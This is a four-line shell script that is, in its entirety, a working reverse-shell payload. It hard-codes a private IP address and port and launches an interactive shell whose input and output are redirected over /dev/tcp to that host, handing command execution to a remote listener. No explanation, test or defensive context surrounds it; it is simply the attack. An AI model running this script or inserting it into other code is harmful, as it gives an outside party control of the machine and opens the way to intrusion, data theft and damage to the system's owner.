#!/bin/sh
IP="10.60.99.29"
PORT="4456"
sh -i >/dev/tcp/$IP/$PORT 2>&1 < /dev/tcp/$IP/$PORT
